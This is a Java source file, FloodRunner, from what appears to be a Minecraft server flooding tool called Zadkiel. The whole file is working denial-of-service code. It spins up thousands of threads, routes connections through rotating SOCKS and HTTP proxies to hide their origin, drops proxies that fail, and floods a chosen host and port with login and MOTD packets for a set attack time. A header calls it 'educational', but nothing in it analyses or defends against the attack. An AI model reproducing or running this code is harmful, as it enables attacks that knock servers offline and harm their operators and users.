///Created by Daniel.Arvizu.Rosselli ///
// Free Use | No Licence //
// Made For Educational Purposes | Enjoy :D //
package me.kurumifake.zadkiel.flood;

import java.io.DataOutputStream;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import me.kurumifake.zadkiel.Zadkiel;
import me.kurumifake.zadkiel.helper.PingHelper;
import me.kurumifake.zadkiel.helper.SRVResolver;
import me.kurumifake.zadkiel.network.SocketHttp;
import me.kurumifake.zadkiel.option.Options;
import me.kurumifake.zadkiel.proxy.Proxies;

public class FloodRunner {
    private final Options options;
    private final Proxies proxies;
    private int connections;
    private int failed;
    private int timed;
    private int maxConnections;
    private final Flooders flooders;
    public FloodRunner(Options options, Proxies proxies) {
        this.connections = 0;
        this.failed = 0;
        this.timed = 0;
        this.maxConnections = -1;
        this.flooders = new Flooders();
        this.options = options;
        this.proxies = proxies;
    }

    public void run() {
        String host = (String)this.options.getOption("host", "127.0.0.1");
        int port = ((Integer)this.options.getOption("port", Integer.valueOf(25565))).intValue();
        boolean srvResolve = ((Boolean)this.options.getOption("srvResolve", Boolean.valueOf(true))).booleanValue();
        boolean alwaysResolve = ((Boolean)this.options.getOption("alwaysResolve", Boolean.valueOf(false))).booleanValue();
        int threads = ((Integer)this.options.getOption("threads", Integer.valueOf(1000))).intValue();
        int connections = ((Integer)this.options.getOption("connections", Integer.valueOf(1000))).intValue();
        int attackTime = ((Integer)this.options.getOption("time", Integer.valueOf(30))).intValue();
        boolean srvResolve2 = ((Boolean)this.options.getOption("srvResolve2", Boolean.valueOf(false))).booleanValue();
        int timeout = ((Integer)this.options.getOption("timeout", Integer.valueOf(500))).intValue();
        boolean keepAlive = ((Boolean)this.options.getOption("keepAlive", Boolean.valueOf(true))).booleanValue();
        String floodName = String.valueOf(this.options.getOption("method", "1"));
        boolean removeFailure = ((Boolean)this.options.getOption("removeFailure", Boolean.valueOf(true))).booleanValue();
        Flooders.LOOP_AMOUNT = ((Integer)this.options.getOption("loopAmount", Integer.valueOf(1900))).intValue();
        boolean print = ((Boolean)this.options.getOption("print", Boolean.valueOf(false))).booleanValue();
        boolean socksV4 = ((Boolean)this.options.getOption("socksV4", Boolean.valueOf(true))).booleanValue();

        Prepares.loadUniversalLoginBytes(Zadkiel.protocol, (byte)Zadkiel.nickSizes);
        Prepares.loadUniversalMotdBytes(Zadkiel.protocol);
        Prepares.loadUniversalLegacyMotdBytes(Zadkiel.protocol);

        if (srvResolve && alwaysResolve)
            System.out.println("ServerResolver & AlwaysResolve las opciones esthabilitadas al mismo tiempo, seguro de que estbien, y quiere continuar?");
        if (srvResolve) {
            String resolvedIp = SRVResolver.srv(host);
            String[] resolvedSplit = resolvedIp.split(":");
            host = resolvedSplit[0];
            port = Integer.parseInt(resolvedSplit[1]);
        }
        PingHelper.testPing(new InetSocketAddress(host, port), host, port);
        Flooders.Flooder flooder = this.flooders.findById(String.valueOf(floodName));
        if (flooder == null) {
            System.out.println("flooder doesn't exits. list of floods: \033[36m" + this.flooders
            .getFlooders().toString());
            System.exit(1);
            return;
        }
        if (srvResolve2)
            try {
            String latest = "unknown";
            for (InetAddress resolved : InetAddress.getAllByName(host)) {
                try {
                    Socket socket = new Socket();
                    socket.connect(new InetSocketAddress(latest = resolved.getHostAddress(), port), 1000);
                    socket.getOutputStream().write(0);
                } catch (Exception ex) {
                    System.out.println("IP found: " + resolved.getHostAddress() + " but cant connect = (");
                }
                    System.out.println("IP found; " + resolved.getHostAddress());
                }
                    System.out.println("resolved, using: " + (host = latest));
                } catch (Exception ex) {
                    System.out.println("resolving failed " + ex.getMessage());
                }
        (new Timer()).scheduleAtFixedRate(new TimerTask() {
            public void run() {
                System.out.println("socket connected successfully: " + FloodRunner.this.connections + "/" + FloodRunner.this.maxConnections + "\nfailed: " + FloodRunner.this.failed + ", timed: " + FloodRunner.this.timed + ", proxies: " + FloodRunner.this.proxies
                .size());
            }
        },  8000L, 8000L);
        (new Thread(() -> {
        try {
            Thread.sleep(1000L * attackTime);
        } catch (Exception exception) {}
            System.out.println("attack finished");
            System.exit(-1);
            })).start();
        ExecutorService executorService = Executors.newFixedThreadPool(threads);
        System.out.println("sending packets to " + host + ":" + port + ", method: " + floodName + ", threads: " + threads + ", attack time: " + attackTime);
        this.maxConnections = threads * connections;
        String finalServerName = host;
        int finalPort = port;
        for (int j = 0; j < threads; j++) {
            executorService.submit(() -> {
                try {
                    String newServerName;
                    int newServerPort;
                    if (alwaysResolve) {
                        String resolvedIp = SRVResolver.srv(finalServerName);
                        String[] resolvedSplit = resolvedIp.split(":");
                        newServerName = resolvedSplit[0];
                        newServerPort = Integer.parseInt(resolvedSplit[1]);
                    } else {
                        newServerName = finalServerName;
                        newServerPort = finalPort;
                    }
                    Proxy lastProxy = null;
                    for (int i = 0; i < connections; i++) {
                    try {
                        Proxy proxy = lastProxy = this.proxies.nextProxy();
                        Socket socket = (proxy.type() == Proxy.Type.HTTP) ? (Socket)new SocketHttp(newServerName, newServerPort, proxy.address(), timeout) : new Socket(proxy);
                        if (!(socket instanceof SocketHttp)) {
                            if (socksV4)
                            try {
                                Method m = socket.getClass().getDeclaredMethod("getImpl", new Class[0]);
                                m.setAccessible(true);
                                Object sd = m.invoke(socket, new Object[0]);
                                m = sd.getClass().getDeclaredMethod("setV4", new Class[0]);
                                m.setAccessible(true);
                                m.invoke(sd, new Object[0]);
                            } catch (Exception exception) {}
                                socket.connect(new InetSocketAddress(newServerName, newServerPort), timeout);
                            }
                    DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                    flooder.flood(out, newServerName, newServerPort);
                    out.flush();
                    this.connections++;
                    if (print)
                        System.out.println("connecting" + newServerName + ":" + newServerPort + " | " + proxy.address().toString() + " x" + this.connections); 
                    if (!keepAlive)
                        socket.close();
                    } catch (Exception ex) {
                        this.failed++;
                            if (ex.getMessage().contains("reply")) {
                            this.timed++;
                            if (removeFailure)
                            this.proxies.removeProxy(lastProxy);
                        }
                    }
                }
            } catch (Exception exception) {}
            });
        }
    }
}
